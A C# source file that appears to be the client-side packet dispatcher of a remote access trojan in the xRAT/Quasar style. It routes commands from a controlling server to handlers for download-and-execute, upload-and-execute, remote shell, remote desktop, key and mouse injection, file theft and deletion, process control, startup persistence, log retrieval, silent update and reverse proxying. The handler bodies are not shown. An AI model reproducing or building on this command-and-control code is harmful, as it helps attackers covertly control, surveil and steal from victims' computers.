using xClient.Core.Commands;
using xClient.Core.ReverseProxy;

namespace xClient.Core.Packets
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IPacket packet)
        {
            var type = packet.GetType();
            //MessageBox.Show(type.FullName);
            if (type == typeof(Core.Packets.ServerPackets.InitializeCommand))
            {
                CommandHandler.HandleInitializeCommand((Core.Packets.ServerPackets.InitializeCommand)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.DownloadAndExecute))
            {
                CommandHandler.HandleDownloadAndExecuteCommand((Core.Packets.ServerPackets.DownloadAndExecute)packet,
                    client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.UploadAndExecute))
            {
                CommandHandler.HandleUploadAndExecute((Core.Packets.ServerPackets.UploadAndExecute)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.Disconnect))
            {
                Program.Disconnect();
            }
            else if (type == typeof(Core.Packets.ServerPackets.Reconnect))
            {
                Program.Disconnect(true);
            }
            else if (type == typeof(Core.Packets.ServerPackets.Uninstall))
            {
                CommandHandler.HandleUninstall((Core.Packets.ServerPackets.Uninstall)packet, client);
            }

            else if (type == typeof(Core.Packets.ServerPackets.Desktop))
            {
                CommandHandler.HandleRemoteDesktop((Core.Packets.ServerPackets.Desktop)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.GetProcesses))
            {
                CommandHandler.HandleGetProcesses((Core.Packets.ServerPackets.GetProcesses)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.KillProcess))
            {
                CommandHandler.HandleKillProcess((Core.Packets.ServerPackets.KillProcess)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.StartProcess))
            {
                CommandHandler.HandleStartProcess((Core.Packets.ServerPackets.StartProcess)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.Drives))
            {
                CommandHandler.HandleDrives((Core.Packets.ServerPackets.Drives)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.Directory))
            {
                CommandHandler.HandleDirectory((Core.Packets.ServerPackets.Directory)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.DownloadFile))
            {
                CommandHandler.HandleDownloadFile((Core.Packets.ServerPackets.DownloadFile)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.ZipFile))
            {
                CommandHandler.HandleZipFolder((Core.Packets.ServerPackets.ZipFile)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.MouseClick))
            {
                CommandHandler.HandleMouseClick((Core.Packets.ServerPackets.MouseClick)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.KeyPress))
            {
                CommandHandler.HandleKeyPress((Core.Packets.ServerPackets.KeyPress)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.OnJoin))
            {
                CommandHandler.HandleOnJoin((Core.Packets.ServerPackets.OnJoin)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.GetSystemInfo))
            {
                CommandHandler.HandleGetSystemInfo((Core.Packets.ServerPackets.GetSystemInfo)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.VisitWebsite))
            {
                CommandHandler.HandleVisitWebsite((Core.Packets.ServerPackets.VisitWebsite)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.ShowMessageBox))
            {
                CommandHandler.HandleShowMessageBox((Core.Packets.ServerPackets.ShowMessageBox)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.Update))
            {
                CommandHandler.HandleUpdate((Core.Packets.ServerPackets.Update)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.Monitors))
            {
                CommandHandler.HandleMonitors((Core.Packets.ServerPackets.Monitors)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.ShellCommand))
            {
                CommandHandler.HandleShellCommand((Core.Packets.ServerPackets.ShellCommand)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.Rename))
            {
                CommandHandler.HandleRename((Core.Packets.ServerPackets.Rename)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.Delete))
            {
                CommandHandler.HandleDelete((Core.Packets.ServerPackets.Delete)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.Action))
            {
                CommandHandler.HandleAction((Core.Packets.ServerPackets.Action)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.GetStartupItems))
            {
                CommandHandler.HandleGetStartupItems((Core.Packets.ServerPackets.GetStartupItems)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.AddStartupItem))
            {
                CommandHandler.HandleAddStartupItem((Core.Packets.ServerPackets.AddStartupItem)packet, client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.DownloadFileCanceled))
            {
                CommandHandler.HandleDownloadFileCanceled((Core.Packets.ServerPackets.DownloadFileCanceled)packet,
                    client);
            }
            else if (type == typeof(Core.Packets.ServerPackets.GetLogs))
            {
                CommandHandler.HandleGetLogs((Core.Packets.ServerPackets.GetLogs)packet, client);
            }
            else if (type == typeof(Core.ReverseProxy.Packets.ReverseProxyConnect) ||
                     type == typeof(Core.ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                     type == typeof(Core.ReverseProxy.Packets.ReverseProxyData) ||
                     type == typeof(Core.ReverseProxy.Packets.ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
        }
    }
}
